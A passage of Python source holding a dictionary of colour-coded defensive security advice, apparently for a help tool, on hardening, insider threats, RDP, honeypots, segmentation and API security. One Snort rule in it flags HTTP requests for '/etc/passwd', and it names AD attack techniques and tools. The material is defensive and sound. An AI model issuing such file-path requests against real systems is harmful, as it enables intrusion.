            "how to secure cloud storage": f"{Colors.RED}Cloud Storage Security:{Colors.END}\n"
                               f"{Colors.GREEN}• Use strong encryption — Encrypt sensitive files before upload, and ensure the cloud provider uses encryption both at rest and in transit (AES-256, TLS).{Colors.END}\n"
                               f"{Colors.GREEN}• Enable multi-factor authentication (MFA) — Add an extra layer of identity verification to prevent unauthorized access, even if passwords are compromised.{Colors.END}\n"
                               f"{Colors.GREEN}• Monitor access logs and user activity — Enable logging to track who accessed what, when, and from where. Look for suspicious behavior or access outside of normal hours.{Colors.END}\n"
                               f"{Colors.RED}• Understand the shared responsibility model — Know what security aspects the cloud provider covers (e.g., infrastructure), and what you are responsible for (e.g., account access, data security).{Colors.END}\n"
                               f"{Colors.GREEN}• Conduct regular access reviews — Audit user permissions, remove inactive accounts, and follow the principle of least privilege.{Colors.END}\n"
                               f"{Colors.YELLOW}• Example Tools: AWS CloudTrail, Google Workspace Admin Logs, Azure Monitor{Colors.END}",
            




        
            "how to prevent data breach": f"{Colors.RED}Data Breach Prevention:{Colors.END}\n"
                             f"{Colors.GREEN}• Implement strong data classification policies to identify and categorize sensitive information based on its risk level.{Colors.END}\n"
                             f"{Colors.GREEN}• Deploy Data Loss Prevention (DLP) tools to monitor, detect, and block unauthorized data exfiltration across endpoints, networks, and cloud environments.{Colors.END}\n"
                             f"{Colors.GREEN}• Conduct regular and comprehensive security awareness training for all employees focusing on phishing, social engineering, password hygiene, and secure data handling.{Colors.END}\n"
                             f"{Colors.RED}• Continuously monitor data access patterns and anomalies using user behavior analytics (UBA) and security information and event management (SIEM) systems to identify suspicious activities early.{Colors.END}\n"
                             f"{Colors.GREEN}• Encrypt sensitive data both at rest and in transit using strong encryption standards (e.g., AES-256, TLS 1.3) to ensure data confidentiality even if compromised.{Colors.END}\n"
                             f"{Colors.GREEN}• Enforce strict access controls with role-based access control (RBAC) and the principle of least privilege to limit exposure of sensitive data.{Colors.END}\n"
                             f"{Colors.GREEN}• Regularly patch and update all systems, applications, and databases to close known vulnerabilities that could be exploited to access data.{Colors.END}\n"
                             f"{Colors.RED}• Implement multi-factor authentication (MFA) for all systems accessing sensitive data to prevent unauthorized access from compromised credentials.{Colors.END}\n"
                             f"{Colors.GREEN}• Conduct periodic penetration testing and vulnerability assessments to identify and remediate security weaknesses proactively.{Colors.END}\n"
                             f"{Colors.YELLOW}• Example: Use tools like Varonis or Symantec DLP combined with employee training platforms for a holistic defense.{Colors.END}"

 
}


       # NEW: Defense Techniques
        self.defense_techniques = {
            "how to implement defense in depth": f"{Colors.MAGENTA}Defense in Depth Strategy:{Colors.END}\n"
                                         f"{Colors.GREEN}• Layer physical security: Secure server rooms, badge access, CCTV, and motion sensors{Colors.END}\n"
                                         f"{Colors.GREEN}• Network segmentation: Use VLANs, DMZs, firewalls, and microsegmentation to isolate sensitive areas{Colors.END}\n"
                                         f"{Colors.GREEN}• Endpoint protection: Install antivirus, EDR, and ensure patch management on workstations and servers{Colors.END}\n"
                                         f"{Colors.GREEN}• Application security: Enforce input validation, output encoding, and secure software development practices{Colors.END}\n"
                                         f"{Colors.GREEN}• Identity management: Enforce MFA, RBAC (role-based access control), and disable inactive accounts{Colors.END}\n"
                                         f"{Colors.RED}• Monitoring and detection: Implement SIEM, IDS/IPS, behavioral analytics, and log analysis tools across all layers{Colors.END}\n"
                                         f"{Colors.RED}• Recovery and response: Use backups, incident response plans, and regular tabletop exercises{Colors.END}\n\n"
                                         f"{Colors.YELLOW}Example Scenario: Defense-in-depth in a corporate environment{Colors.END}\n"
                                         f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                         f"{Colors.YELLOW}• Web app in DMZ -> WAF in front -> App runs as non-root -> Logs sent to SIEM{Colors.END}\n"
                                         f"{Colors.YELLOW}• Backend database on separate subnet -> Encrypted traffic (TLS) -> Only accessible from app subnet{Colors.END}\n"
                                         f"{Colors.YELLOW}• All systems have antivirus & patched regularly -> Admins use jump box w/ MFA{Colors.END}",



         
             

            "how to mitigate zero-day exploits": f"{Colors.CYAN}How To Mitigate Zero-Day Exploits:{Colors.END}\n"
                                     f"{Colors.GREEN}• Description:{Colors.END} Zero-day exploits target unknown or unpatched vulnerabilities. Since there’s no prior signature, traditional defenses often fail.\n\n"
                                     f"{Colors.GREEN}• Mitigation Strategies:{Colors.END}\n"
                                     f"{Colors.YELLOW}  1. Network Segmentation:{Colors.END} Limit access so a compromise doesn't spread laterally.\n"
                                     f"{Colors.YELLOW}  2. Application Whitelisting:{Colors.END} Allow only approved apps to run, blocking unknown payloads.\n"
                                     f"{Colors.YELLOW}  3. Virtual Patching:{Colors.END} Use intrusion prevention systems (IPS) to block malicious behavior even without a real patch.\n"
                                     f"{Colors.YELLOW}  4. Endpoint Detection & Response (EDR):{Colors.END} Monitor for abnormal behavior that may signal zero-day activity.\n"
                                     f"{Colors.YELLOW}  5. Threat Intelligence Feeds:{Colors.END} Stay updated with IOCs (Indicators of Compromise) and behavior-based rules.\n"
                                     f"{Colors.YELLOW}  6. Sandbox Analysis:{Colors.END} Analyze suspicious files in an isolated environment before allowing execution.\n\n"
                                     f"{Colors.GREEN}• Recommended Tools:{Colors.END}\n"
                                     f"{Colors.YELLOW}  • CrowdStrike Falcon\n"
                                     f"  • FireEye HX\n"
                                     f"  • Snort or Suricata (with behavior rules)\n"
                                     f"  • Cuckoo Sandbox\n"
                                     f"  • Sysmon + ELK stack\n\n"
                                     f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                     f"{Colors.YELLOW}  • Educate employees on phishing — often the entry point.\n"
                                     f"  • Enforce least privilege on all accounts.\n"
                                     f"  • Disable macros and unnecessary plugins.\n\n"
                                     f"{Colors.CYAN}Note:{Colors.END} Zero-day mitigation is about layered defense and proactive monitoring — not a single solution. No system is 100% secure, but risk can be minimized.",




            "how to harden operating systems": f"{Colors.CYAN}How To Harden Operating Systems:{Colors.END}\n"
                                   f"{Colors.GREEN}• Description:{Colors.END} Hardening an operating system involves reducing its attack surface by disabling unnecessary services, applying patches, and enforcing strict security policies.\n\n"
                                   f"{Colors.GREEN}• Hardening Steps:{Colors.END}\n"
                                   f"{Colors.YELLOW}  1. Remove Unused Software:{Colors.END} Uninstall applications and services that are not required.\n"
                                   f"{Colors.YELLOW}  2. Apply Security Patches:{Colors.END} Keep the OS up to date with the latest security patches and updates.\n"
                                   f"{Colors.YELLOW}  3. Configure Firewalls:{Colors.END} Restrict incoming and outgoing traffic to necessary ports only.\n"
                                   f"{Colors.YELLOW}  4. Enforce Strong Password Policies:{Colors.END} Set complexity requirements, expiration, and history.\n"
                                   f"{Colors.YELLOW}  5. Disable Unused Ports and Protocols:{Colors.END} Close unnecessary network services.\n"
                                   f"{Colors.YELLOW}  6. Use Security Benchmarks:{Colors.END} Follow CIS or DISA STIG guidelines for system configuration.\n\n"
                                   f"{Colors.GREEN}• Recommended Tools:{Colors.END}\n"
                                   f"{Colors.YELLOW}  • Lynis (Linux auditing)\n"
                                   f"  • Microsoft Baseline Security Analyzer (MBSA)\n"
                                   f"  • CIS-CAT (Center for Internet Security tool)\n"
                                   f"  • AuditD (Linux auditing)\n\n"
                                   f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                   f"{Colors.YELLOW}  • Set up centralized logging and auditing.\n"
                                   f"  • Disable guest accounts.\n"
                                   f"  • Enable UFW or iptables on Linux, Windows Defender Firewall on Windows.\n\n"
                                   f"{Colors.CYAN}Note:{Colors.END} OS hardening is critical in any secure environment. Combine it with continuous monitoring and regular audits for best results.",





            "how to protect against insider threats": f"{Colors.CYAN}How To Protect Against Insider Threats:{Colors.END}\n"
                                          f"{Colors.GREEN}• Description:{Colors.END} Insider threats are security risks posed by individuals within the organization who might misuse access to harm data, systems, or reputation — intentionally or unintentionally.\n\n"
                                          f"{Colors.GREEN}• Key Prevention Strategies:{Colors.END}\n"
                                          f"{Colors.YELLOW}  1. Least Privilege Principle:{Colors.END} Only grant users the access they truly need.\n"
                                          f"{Colors.YELLOW}  2. Monitoring and Logging:{Colors.END} Use tools to track user activity, especially privileged users.\n"
                                          f"{Colors.YELLOW}  3. User Behavior Analytics (UBA):{Colors.END} Detect abnormal behavior patterns early.\n"
                                          f"{Colors.YELLOW}  4. Termination Protocols:{Colors.END} Immediately revoke access when an employee leaves or changes role.\n"
                                          f"{Colors.YELLOW}  5. Regular Security Awareness Training:{Colors.END} Educate staff on data handling, phishing, and reporting suspicious activity.\n\n"
                                          f"{Colors.GREEN}• Recommended Tools:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • SIEM Systems (e.g., Splunk, ELK, QRadar)\n"
                                          f"  • DLP (Data Loss Prevention) solutions\n"
                                          f"  • UBA Tools (e.g., Exabeam, Varonis)\n\n"
                                          f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • Rotate access credentials regularly.\n"
                                          f"  • Set up automated alerts for sensitive file access or exfiltration.\n"
                                          f"  • Monitor cloud and USB data transfers.\n\n"
                                          f"{Colors.CYAN}Note:{Colors.END} Not all insider threats are malicious — human error is also a major vector. A mix of policy, training, and monitoring is essential.",




            "how to defend against zero-day attacks": f"{Colors.CYAN}How To Defend Against Zero-Day Attacks:{Colors.END}\n"
                                          f"{Colors.GREEN}• Description:{Colors.END} Zero-day attacks exploit unknown vulnerabilities in software or hardware before developers can issue a fix. These are among the most dangerous cyber threats.\n\n"
                                          f"{Colors.GREEN}• Defense Strategies:{Colors.END}\n"
                                          f"{Colors.YELLOW}  1. Use Behavior-Based Detection:{Colors.END} Employ EDR and XDR tools that detect abnormal behavior, not just known signatures.\n"
                                          f"{Colors.YELLOW}  2. Patch Management:{Colors.END} Although zero-days are unpatched, keeping systems updated reduces attack surface.\n"
                                          f"{Colors.YELLOW}  3. Network Segmentation:{Colors.END} Limit the impact if one segment is compromised.\n"
                                          f"{Colors.YELLOW}  4. Implement Application Whitelisting:{Colors.END} Prevent unknown software from running without approval.\n"
                                          f"{Colors.YELLOW}  5. Threat Intelligence Feeds:{Colors.END} Subscribe to real-time feeds that warn of new indicators of compromise (IOCs).\n\n"
                                          f"{Colors.GREEN}• Recommended Tools:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • CrowdStrike Falcon, SentinelOne (Behavior-based EDR)\n"
                                          f"  • Cisco Talos, FireEye Threat Intelligence\n"
                                          f"  • OSSEC, Wazuh (host-based monitoring)\n\n"
                                          f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • Use sandboxing to observe suspicious file behavior.\n"
                                          f"  • Enable logging and analyze anomalies regularly.\n"
                                          f"  • Educate users about opening unknown attachments or links.\n\n"
                                          f"{Colors.CYAN}Note:{Colors.END} Zero-day defense relies heavily on proactive detection, layered security, and rapid response capabilities.",





            "how to harden active directory": f"{Colors.CYAN}How To Harden Active Directory (AD):{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} Active Directory (AD) is a critical component in enterprise environments, managing user authentication and access control. Hardening it prevents privilege escalation, lateral movement, and domain compromise.\n\n"
                                  f"{Colors.GREEN}• Defense Strategies:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. Use Tiered Access Model:{Colors.END} Separate administrative privileges into tiers (Tier 0, Tier 1, Tier 2).\n"
                                  f"{Colors.YELLOW}  2. Enable LDAP Signing & Channel Binding:{Colors.END} Prevent man-in-the-middle attacks.\n"
                                  f"{Colors.YELLOW}  3. Remove Legacy Protocols:{Colors.END} Disable SMBv1, NTLMv1, and others that are insecure.\n"
                                  f"{Colors.YELLOW}  4. Use LAPS (Local Admin Password Solution):{Colors.END} Rotate local admin passwords securely.\n"
                                  f"{Colors.YELLOW}  5. Monitor AD Changes:{Colors.END} Use tools like Microsoft ATA, Event logs, or Sysmon for change detection.\n\n"
                                  f"{Colors.GREEN}• Tools & Commands:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • BloodHound: Map and analyze AD relationships\n"
                                  f"  • PowerView: Enumerate permissions and user groups\n"
                                  f"  • ADACLScanner: Review weak ACLs in AD objects\n\n"
                                  f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Disable unused accounts and enforce password policies.\n"
                                  f"  • Restrict Domain Admin accounts to domain controllers only.\n"
                                  f"  • Limit logon rights and use administrative workstations for admin accounts.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} Hardened AD environments are crucial for reducing the blast radius of attacks like ransomware and internal threats.",






            "how to detect and prevent insider threats": f"{Colors.CYAN}How To Detect and Prevent Insider Threats:{Colors.END}\n"
                                            f"{Colors.GREEN}• Description:{Colors.END} Insider threats involve malicious or negligent actions by employees, contractors, or partners that can compromise an organization’s security.\n\n"
                                            f"{Colors.GREEN}• Types of Insider Threats:{Colors.END}\n"
                                            f"{Colors.YELLOW}  1. Malicious Insiders:{Colors.END} Individuals who intentionally steal data or sabotage systems.\n"
                                            f"{Colors.YELLOW}  2. Negligent Insiders:{Colors.END} Users who unintentionally expose systems (e.g., clicking phishing links).\n"
                                            f"{Colors.YELLOW}  3. Compromised Insiders:{Colors.END} Users whose credentials have been stolen and misused by attackers.\n\n"
                                            f"{Colors.GREEN}• Detection Techniques:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Use User Behavior Analytics (UBA):{Colors.END} Detect anomalies in user behavior.\n"
                                            f"{Colors.YELLOW}  • Monitor File Access and Transfers:{Colors.END} Track access to sensitive files or mass downloads.\n"
                                            f"{Colors.YELLOW}  • SIEM Integration:{Colors.END} Correlate logs from endpoints, email, and apps.\n"
                                            f"{Colors.YELLOW}  • Alert on Privilege Abuse:{Colors.END} Watch for privilege escalations or lateral movement.\n\n"
                                            f"{Colors.GREEN}• Prevention Strategies:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Enforce Least Privilege Principle\n"
                                            f"  • Regularly audit permissions and access rights\n"
                                            f"  • Provide security awareness training\n"
                                            f"  • Monitor for exfiltration attempts (e.g., USB, email, cloud)\n\n"
                                            f"{Colors.GREEN}• Tools:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Splunk\n"
                                            f"  • Microsoft Defender for Endpoint\n"
                                            f"  • Ekran System\n"
                                            f"  • ObserveIT\n\n"
                                            f"{Colors.CYAN}Note:{Colors.END} Insider threats are among the hardest to detect. Combining monitoring, policy enforcement, and user training is key to effective prevention.",




            "how to apply threat modeling in infrastructure": f"{Colors.CYAN}How To Apply Threat Modeling in Infrastructure:{Colors.END}\n"
                                                 f"{Colors.GREEN}• Description:{Colors.END} Threat modeling helps identify, quantify, and address potential security risks early in the infrastructure design or operational lifecycle.\n\n"
                                                 f"{Colors.GREEN}• Why Use Threat Modeling:{Colors.END}\n"
                                                 f"{Colors.YELLOW}  • Understand attacker goals and methods\n"
                                                 f"  • Identify high-risk assets and weak points\n"
                                                 f"  • Strengthen security posture before attacks happen\n\n"
                                                 f"{Colors.GREEN}• Common Threat Modeling Frameworks:{Colors.END}\n"
                                                 f"{Colors.YELLOW}  1. STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)\n"
                                                 f"  2. DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability)\n"
                                                 f"  3. PASTA (Process for Attack Simulation and Threat Analysis)\n\n"
                                                 f"{Colors.GREEN}• Steps to Apply:{Colors.END}\n"
                                                 f"{Colors.YELLOW}  • Step 1: Define assets and infrastructure components (e.g., web servers, DBs, APIs)\n"
                                                 f"  • Step 2: Map data flows and trust boundaries\n"
                                                 f"  • Step 3: Identify potential threats using STRIDE or DREAD\n"
                                                 f"  • Step 4: Document risks and assign mitigation priorities\n"
                                                 f"  • Step 5: Implement and monitor fixes\n\n"
                                                 f"{Colors.GREEN}• Tools:{Colors.END}\n"
                                                 f"{Colors.YELLOW}  • Microsoft Threat Modeling Tool\n"
                                                 f"  • OWASP Threat Dragon\n"
                                                 f"  • ThreatSpec\n"
                                                 f"  • IriusRisk\n\n"
                                                 f"{Colors.CYAN}Note:{Colors.END} Threat modeling should be a continuous process, especially when infrastructure or applications evolve.",




            "how to harden active directory security": f"{Colors.CYAN}How To Harden Active Directory Security:{Colors.END}\n"
                                           f"{Colors.GREEN}• Description:{Colors.END} Active Directory (AD) is a core identity service in Windows networks. Hardening AD is critical to prevent privilege escalation, domain takeover, and lateral movement by attackers.\n\n"
                                           f"{Colors.GREEN}• Common Threats to AD:{Colors.END}\n"
                                           f"{Colors.YELLOW}  • Pass-the-Hash attacks\n"
                                           f"  • Golden/Silver Ticket attacks\n"
                                           f"  • Kerberoasting\n"
                                           f"  • Unconstrained Delegation abuse\n"
                                           f"  • Misconfigured permissions on OUs, GPOs, and ACLs\n\n"
                                           f"{Colors.GREEN}• Hardening Techniques:{Colors.END}\n"
                                           f"{Colors.YELLOW}  1. Enforce strong password policies and 2FA for privileged accounts\n"
                                           f"  2. Remove legacy protocols like LM/NTLM where possible\n"
                                           f"  3. Monitor use of domain admin accounts — use least privilege\n"
                                           f"  4. Segment AD infrastructure (e.g., Tiered Admin model)\n"
                                           f"  5. Disable unnecessary AD features and services\n"
                                           f"  6. Regularly review and audit ACLs and permissions\n"
                                           f"  7. Use Group Policy to enforce security baselines\n"
                                           f"  8. Patch domain controllers regularly\n\n"
                                           f"{Colors.GREEN}• Tools for Monitoring and Hardening:{Colors.END}\n"
                                           f"{Colors.YELLOW}  • BloodHound (for mapping relationships and abuse paths)\n"
                                           f"  • PingCastle (for AD health & risk assessments)\n"
                                           f"  • Microsoft LAPS (for managing local admin passwords)\n"
                                           f"  • Sysmon + SIEM (for real-time detection of suspicious activity)\n\n"
                                           f"{Colors.CYAN}Note:{Colors.END} AD is a prime target. Hardening must be ongoing, combined with visibility, alerts, and strong operational hygiene.",





            "how to secure remote desktop services": f"{Colors.CYAN}How To Secure Remote Desktop Services (RDP):{Colors.END}\n"
                                         f"{Colors.GREEN}• Description:{Colors.END} Remote Desktop Protocol (RDP) allows users to access systems remotely but is a common attack vector for brute-force attacks, ransomware delivery, and unauthorized access.\n\n"
                                         f"{Colors.GREEN}• Common RDP Security Risks:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Exposed RDP ports to the internet (TCP 3389)\n"
                                         f"  • Weak or default credentials\n"
                                         f"  • No 2FA or network-level authentication (NLA)\n"
                                         f"  • Lack of logging and monitoring\n\n"
                                         f"{Colors.GREEN}• Best Practices for Securing RDP:{Colors.END}\n"
                                         f"{Colors.YELLOW}  1. Do NOT expose RDP directly to the internet — use VPN or bastion host\n"
                                         f"  2. Enable Network Level Authentication (NLA)\n"
                                         f"  3. Enforce strong passwords and enable 2FA\n"
                                         f"  4. Restrict RDP access using firewall rules or IP whitelisting\n"
                                         f"  5. Limit RDP to only necessary users (Principle of Least Privilege)\n"
                                         f"  6. Configure account lockout policies to prevent brute-force\n"
                                         f"  7. Monitor logs for suspicious login attempts (Event IDs 4624, 4625, 4778, 4779)\n"
                                         f"  8. Use RDP gateways for enterprise deployments\n\n"
                                         f"{Colors.GREEN}• Tools and Techniques:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Use `fail2ban` or Windows Firewall to block repeated failed logins\n"
                                         f"  • Monitor RDP logs via SIEM (Splunk, Graylog, etc.)\n"
                                         f"  • Audit RDP sessions with tools like RDPGuard or Sysmon\n\n"
                                         f"{Colors.CYAN}Note:{Colors.END} RDP is powerful but risky if misconfigured. Always isolate, monitor, and harden your RDP deployments to avoid breaches.",



            "how to prevent insider threats": f"{Colors.CYAN}How To Prevent Insider Threats:{Colors.END}\n"
                                f"{Colors.GREEN}• Description:{Colors.END} Insider threats come from employees, contractors, or trusted users who intentionally or unintentionally cause harm by leaking data, sabotaging systems, or abusing access.\n\n"
                                f"{Colors.GREEN}• Types of Insider Threats:{Colors.END}\n"
                                f"{Colors.YELLOW}  1. Malicious insiders – deliberate harm.\n"
                                f"  2. Negligent insiders – accidental mistakes.\n"
                                f"  3. Compromised insiders – external attackers who hijack trusted accounts.\n\n"
                                f"{Colors.GREEN}• Prevention Techniques:{Colors.END}\n"
                                f"{Colors.YELLOW}  • Implement strict access controls (least privilege).\n"
                                f"  • Use role-based access control (RBAC) and regularly review permissions.\n"
                                f"  • Deploy User and Entity Behavior Analytics (UEBA) to detect anomalies.\n"
                                f"  • Monitor and log all user activity (file access, network).\n"
                                f"  • Enforce strong authentication, including MFA.\n"
                                f"  • Conduct regular security awareness training.\n"
                                f"  • Implement Data Loss Prevention (DLP) solutions.\n"
                                f"  • Have clear policies and consequences for misuse.\n"
                                f"  • Monitor for unusual data transfers or privileged operations.\n\n"
                                f"{Colors.GREEN}• Tools to Help:{Colors.END}\n"
                                f"{Colors.YELLOW}  • Splunk, IBM QRadar, or other SIEMs for monitoring.\n"
                                f"  • DLP tools like Symantec, McAfee, or Forcepoint.\n"
                                f"  • UEBA solutions such as Exabeam, Varonis.\n\n"
                                f"{Colors.CYAN}Note:{Colors.END} Insider threats are hard to detect but can cause severe damage. Combining technology, policies, and training is key to mitigation.",






            

            "how to create honeypots": f"{Colors.MAGENTA}Honeypot Implementation:{Colors.END}\n"
                                f"{Colors.GREEN}• Choose appropriate honeypot type:{Colors.END} Low-interaction (e.g., Cowrie) for safety or high-interaction (e.g., Dionaea, Kippo) for deep attacker engagement{Colors.END}\n"
                                f"{Colors.GREEN}• Isolate the honeypot network:{Colors.END} Use firewalls, VLANs, or virtualization to prevent lateral movement into production{Colors.END}\n"
                                f"{Colors.GREEN}• Emulate realistic systems and services:{Colors.END} Simulate SSH, SMB, FTP, HTTP, or even ICS/SCADA systems depending on threat model{Colors.END}\n"
                                f"{Colors.RED}• Enable deep monitoring:{Colors.END} Log keystrokes, file uploads, commands, and connection metadata with centralized log collection (e.g., ELK stack, Graylog){Colors.END}\n"
                                f"{Colors.GREEN}• Analyze attack patterns and behaviors:{Colors.END} Extract TTPs (tactics, techniques, procedures), create threat intel from logs{Colors.END}\n"
                                f"{Colors.YELLOW}Example Setup:{Colors.END}\n"
                                f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                f"{Colors.YELLOW}• Tool: Cowrie honeypot on isolated VM with fake SSH access{Colors.END}\n"
                                f"{Colors.YELLOW}• Logging: Forward logs to SIEM using Filebeat or syslog{Colors.END}\n"
                                f"{Colors.YELLOW}• Analysis: Correlate with known IOCs and MITRE ATT&CK matrix{Colors.END}",

            



        
            "how to implement intrusion detection": f"{Colors.MAGENTA}Intrusion Detection System (IDS):{Colors.END}\n"
                                           f"{Colors.GREEN}• Deploy Network-Based IDS (NIDS):{Colors.END} Monitor traffic across the entire network (e.g., Snort, Suricata){Colors.END}\n"
                                           f"{Colors.GREEN}• Install Host-Based IDS (HIDS):{Colors.END} Monitor changes and activities in system files/logs (e.g., OSSEC, Wazuh){Colors.END}\n"
                                           f"{Colors.GREEN}• Configure Signature-Based Detection:{Colors.END} Match packets or logs against known attack patterns (e.g., rule sets from Emerging Threats){Colors.END}\n"
                                           f"{Colors.GREEN}• Implement Anomaly-Based Detection:{Colors.END} Learn normal behavior and alert on deviations using machine learning (e.g., Zeek, AI modules in Wazuh){Colors.END}\n"
                                           f"{Colors.RED}• Fine-Tune Rules to Reduce False Positives:{Colors.END} Customize IDS rulesets to suit your network profile and asset value{Colors.END}\n"
                                           f"{Colors.YELLOW}Example Configuration Snippet (Snort):{Colors.END}\n"
                                           f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                           f"{Colors.YELLOW}alert tcp any any -> 192.168.1.10 80 (msg:\"HTTP attack detected\"; content:\"/etc/passwd\"; sid:1000001; rev:1;){Colors.END}\n"
                                           f"{Colors.YELLOW}• This rule alerts if a known sensitive file path is found in an HTTP request targeting 192.168.1.10{Colors.END}\n"
                                           f"{Colors.YELLOW}• Log outputs can be sent to a SIEM for correlation (e.g., Splunk, ELK){Colors.END}",

 


    
        
            "how to setup network segmentation": f"{Colors.MAGENTA}Network Segmentation:{Colors.END}\n"
                                         f"{Colors.GREEN}• Create VLANs for Logical Separation:{Colors.END} Isolate departments (e.g., HR, Finance, IT) using VLANs on switches (e.g., VLAN 10, 20, 30){Colors.END}\n"
                                         f"{Colors.GREEN}• Implement Micro-Segmentation:{Colors.END} Use internal firewalls (e.g., host-based firewalls, SDN policies) to isolate workloads within VLANs{Colors.END}\n"
                                         f"{Colors.GREEN}• Use Layer 3 Firewalls Between Segments:{Colors.END} Control traffic btn VLANs using ACLs and firewall rules (e.g., pfSense, Cisco ASA){Colors.END}\n"
                                         f"{Colors.RED}• Apply Zero-Trust Architecture (ZTA):{Colors.END} Assume breach and verify every request with least privilege enforcement (e.g., identity-aware access){Colors.END}\n"
                                         f"{Colors.GREEN}• Monitor Inter-Segment Traffic for Lateral Movement:{Colors.END} Deploy NIDS sensors (e.g., Zeek, Suricata) on inter-VLAN links{Colors.END}\n"
                                         f"{Colors.YELLOW}Example (Cisco-like CLI):{Colors.END}\n"
                                         f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                         f"{Colors.YELLOW}interface Gig0/1\n"
                                         f" switchport mode access\n"
                                         f" switchport access vlan 10  # HR\n"
                                         f"{Colors.YELLOW}interface Gig0/2\n"
                                         f" switchport mode access\n"
                                         f" switchport access vlan 20  # Finance{Colors.END}\n"
                                         f"{Colors.YELLOW}Access Control (ACL):{Colors.END}\n"
                                         f"{Colors.YELLOW}deny ip any 192.168.20.0 0.0.0.255\n"
                                         f"permit ip any any{Colors.END}",

                                               
 


        
            "how to implement access control": f"{Colors.MAGENTA}Access Control Implementation:{Colors.END}\n"
                                       f"{Colors.GREEN}• Use Role-Based Access Control (RBAC):{Colors.END} Assign permissions based on roles like 'admin', 'editor', or 'viewer'. Reduces human error and makes policy management easier.{Colors.END}\n"
                                       f"{Colors.GREEN}• Apply Principle of Least Privilege (PoLP):{Colors.END} Ensure users only have the minimum rights needed to perform their tasks — critical for security and compliance.{Colors.END}\n"
                                       f"{Colors.GREEN}• Deploy Multi-Factor Authentication (MFA):{Colors.END} Require at least two forms of identity (e.g., password + OTP/email/biometric) before granting access.{Colors.END}\n"
                                       f"{Colors.RED}• Conduct Regular Access Reviews and Audits:{Colors.END} Evaluate user roles, orphaned accounts, privilege escalations. Use automated tools or manual reviews every quarter/month.{Colors.END}\n"
                                       f"{Colors.GREEN}• Automate User Provisioning & Deprovisioning:{Colors.END} Integrate with directory services like LDAP, AD, or IAM tools (e.g., Okta, AWS IAM) to manage access lifecycle easily.{Colors.END}\n"
                                       f"{Colors.YELLOW}Example (RBAC Concept in Python):{Colors.END}\n"
                                       f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                       f"{Colors.YELLOW}roles = {{'admin': ['read', 'write', 'delete'], 'user': ['read'], 'auditor': ['read', 'audit_logs']}}\n"
                                       f"def has_access(role, permission):\n"
                                       f"    return permission in roles.get(role, [])\n"
                                       f"\n"
                                       f"print(has_access('admin', 'delete'))  # True\n"
                                       f"print(has_access('user', 'delete'))   # False{Colors.END}",

            

            

            
            "how to create security policies": f"{Colors.MAGENTA}Security Policy Development:{Colors.END}\n"
                                       f"{Colors.GREEN}• Define Clear Security Objectives:{Colors.END} Start by setting the organization's security goals such as protecting data confidentiality, ensuring system availability, and maintaining integrity.\n"
                                       f"{Colors.GREEN}• Align with Business Requirements:{Colors.END} Your policies must support business operations and compliance needs — for example, handling customer data securely in e-commerce.{Colors.END}\n"
                                       f"{Colors.GREEN}• Include Incident Response Procedures:{Colors.END} Define the steps to take during security incidents (who to contact, what logs to collect, how to isolate systems). Example: Establish a Computer Security Incident Response Team (CSIRT).{Colors.END}\n"
                                       f"{Colors.RED}• Regular Policy Reviews and Updates:{Colors.END} Review at least every 6–12 months or after major events. Track changes in threat landscape, tech stack, or regulatory standards like GDPR or HIPAA.{Colors.END}\n"
                                       f"{Colors.GREEN}• Ensure Compliance with Regulations:{Colors.END} Include references to PCI-DSS, ISO 27001, NIST SP 800-53, or local data laws. This makes your organization audit-ready and legally secure.{Colors.END}\n"
                                       f"{Colors.YELLOW}Example Snippet (Security Policy Skeleton):{Colors.END}\n"
                                       f"{Colors.YELLOW}--------------------------------------------------------{Colors.END}\n"
                                       f"{Colors.YELLOW}security_policy = {{\n"
                                       f"    'objective': 'Protect customer data from unauthorized access',\n"
                                       f"    'scope': 'Applies to all IT staff and contractors',\n"
                                       f"    'incident_response': ['Report to SOC', 'Preserve logs', 'Quarantine system'],\n"
                                       f"    'review_cycle': 'Every 6 months',\n"
                                       f"    'compliance': ['GDPR', 'ISO 27001']\n"
                                       f"}}\n"
                                       f"print(security_policy['objective']){Colors.END}",

 



        
            "how to secure apis": f"{Colors.MAGENTA}API Security Implementation:{Colors.END}\n"
                          f"{Colors.GREEN}• Use Authentication and Authorization:{Colors.END} Always use OAuth 2.0, JWT (JSON Web Tokens), or API keys. Restrict access by roles (RBAC).\n"
                          f"{Colors.GREEN}• Validate All Input & Sanitize Data:{Colors.END} Apply strict input validation (whitelisting) and sanitize all parameters to prevent injections like SQLi, XSS.\n"
                          f"{Colors.GREEN}• Implement Rate Limiting & Throttling:{Colors.END} Prevent abuse by limiting how often clients can hit your API (e.g. 1000 req/hour/IP).\n"
                          f"{Colors.GREEN}• Use HTTPS Everywhere:{Colors.END} Never allow API over HTTP; enforce SSL/TLS and HSTS.\n"
                          f"{Colors.RED}• Monitor Logs and Use WAF:{Colors.END} Set up API monitoring/logging, integrate with SIEM tools, and apply Web Application Firewalls to block known attack patterns.\n"
                          f"{Colors.YELLOW}Example Snippet (Python Flask REST API with JWT):{Colors.END}\n"
                          f"{Colors.YELLOW}--------------------------------------------------------{Colors.END}\n"
                          f"{Colors.YELLOW}from flask import Flask, request, jsonify\n"
                          f"import jwt\n"
                          f"from functools import wraps\n\n"
